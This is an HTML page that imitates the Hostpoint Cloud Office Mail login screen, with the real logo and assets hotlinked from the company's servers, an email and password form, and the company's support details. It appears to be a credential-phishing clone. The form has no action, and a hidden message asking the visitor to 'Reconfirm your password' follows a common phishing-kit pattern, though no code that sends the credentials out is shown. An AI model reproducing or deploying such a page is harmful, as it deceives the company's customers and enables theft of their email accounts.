

<!DOCTYPE html >
<html ng-app="rymcApp" lang={{lang}}>
<head>
    <meta charset="utf-8">
    
    <title>
        Hostpoint Login - Cloud Office Mail
    </title>
    
    <link rel="shortcut icon" href="https://admin.hostpoint.ch/favicon.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">

<link href="https://fonts.googleapis.com/css?family=Amatic+SC:400,700|Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i|Pompiere" rel="stylesheet">

        <link rel="stylesheet" type="text/css" href="https://admin.hostpoint.ch/dist/css/vendor-login-b0a73d023a.min.css">

        <link rel="stylesheet" type="text/css" href="https://admin.hostpoint.ch/dist/css/login-cd4fa7f391.min.css">

    
</head>

<body>
<body class="controlpanel login-webmail">


    

    <form>
    

        <div class="wrapper login-form-wrapper">
            <div class="content-wrapper">
                <div class="header">
                    <div class="logo">
                            <img src="https://admin.hostpoint.ch/img/theme/logo/hostpoint-login-ox@2x.png">
                    </div>
                </div>

                <div class="content">
                    <ul class="nav nav-pills nav-justified">
                        <li class="controlpanel ">
                            <a href="Login" name="controlpanel" onclick="_paq.push(['trackEvent', 'Change Login', 'zu Control Panel']);">
                                Control Panel
                            </a>
                        </li>
                        <li class="webmail active">
                            <a href="CloudOffice" name="webmail" onclick="_paq.push(['trackEvent', 'Change Login', 'zu Webmail']);">
                                    Cloud Office Mail
                            </a>
                        </li>
                    </ul>
                    <div class="tab-content panel panel-default">
                        <div class="image">
                                    <!--suppress HtmlUnknownTarget -->
                                    <img src="https://admin.hostpoint.ch/img/theme/login/icon-cloud-office@2x.png">
                        </div>

                        <div class="title title-webmail">Cloud Office Mail</div>

                        <div id="msg" class="signInError" role="alert" tabindex="0" style="display:none;">Reconfirm your password</div>

<div class="form has-pretty-child">


        <div class="form-group">
            <input type="email" id="email" name="email" value="" class="form-control" placeholder="E-Mail address" required="required" >
        </div>
            <div class="form-group has-pretty-child">
                <input type="password" name="password" value="" id="password" class="form-control" placeholder="Password" required="required">

                <div class="clearfix prettycheckbox labelright  "><input id="show_password" name="show_password" type="checkbox" data-toggle="checkbox" data-label="Show plain password" data-parsley-multiple="show_password" style="display: none;"><a href="#" class=" "></a>
<label for="show_password">Show plain password</label></div>
            </div>

        <div class="form-group row">

            <div class="col-sm-12">
                    <button id="submit-btn"  class="btn btn-primary ladda-button do-login"><span class="ladda-label">
                        Login
                    </span><span class="ladda-spinner"></span></button>
            </div>
        </div>

        <div class="clearfix prettycheckbox labelright  "><input id="autologin" name="autologin" type="checkbox" class="pretty" data-toggle="checkbox" data-label="Stay logged in" checked="" data-parsley-multiple="autologin" style="display: none;"><a href="#" class="checked "></a>
<label for="autologin">Stay logged in</label></div>
        <!--suppress HtmlUnknownTarget -->
        <a href="LostCloudOfficePassword" class="lost-password">Forgot your e-mail password?</a>

</div>


                    </div>
                </div>
                <div class="support">
                    <div class="title">Support</div>
                    <div class="number">0844 040404</div>
                </div>
            </div>
            <div class="footer">
                <p>Hostpoint AG, Neue Jonastrasse 60, 8640 Rapperswil-Jona,
                    <a href="" target="" rel="noopener">www.hostpoint.ch</a>
                </p>
            </div>
        </div>



    </form>

    

</body>
